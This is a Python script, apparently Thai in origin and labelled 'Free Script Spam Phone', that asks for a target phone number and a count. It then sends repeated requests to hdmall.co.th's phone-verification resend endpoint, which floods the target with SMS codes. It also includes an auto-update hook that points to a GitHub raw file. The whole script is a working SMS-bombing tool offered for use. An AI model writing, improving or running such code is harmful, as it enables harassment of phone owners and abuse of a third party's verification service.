from requests import post, Session
from re import search
from random import choice
from string import ascii_uppercase, digits
from concurrent.futures import ThreadPoolExecutor
import asyncio
import threading
import requests
import AutoUpdate
import os
import time

AutoUpdate.set_url("https://raw.githubusercontent.com/ZeroN2/auto-update-test/UpdateAuto/.version")
AutoUpdate.set_download_link("https://raw.githubusercontent.com/ZeroN2/auto-update-test/main/main1.py")
AutoUpdate.set_current_version("0")


version = "1"
api = "1"

os.system("clear")
print("              Version Script : ",version)
print("           Total Api : ",api)
print("         Free Script Spam Phone")
print("")
print("")
choice = input("1 ==> Update Script \n2 ==> Run Script \n\nEnter Choice ==> ")
choice = int(choice)


if choice == 1:
	os.system("clear")
	print("กำลังโหลดอัพเดท...")
	time.sleep(2)
	#AutoUpdate.download("main.py")
	print("อัพเดทไฟล์เสร็จแล้ว...")
	time.sleep(2)
	os.system("clear && python3 main.py")
elif choice == 2:
	os.system("clear")
	phone = input("Phone : ")
	amount = input("Amount : ")
	start = input("Enter To Start")
	os.system("clear")
	time.sleep(2)
	print(f"เบอร์ที่ยิง : {phone}\nยิงทั้งหมด : {amount} รอบ")
	time.sleep(1)
	
	
	def run(phone, amount):
		for _ in range(int(amount)):
			threading.Thread(target=spam1(phone)).start()
			
			
			
	def spam1(phone):
		url = f"https://hdmall.co.th/phone_verifications?mobile={phone}&resend=true"
		r = requests.get(url)
		print("\rสถานะการร้องขอ api : ", r.status_code)

	start = run(phone, amount)


	
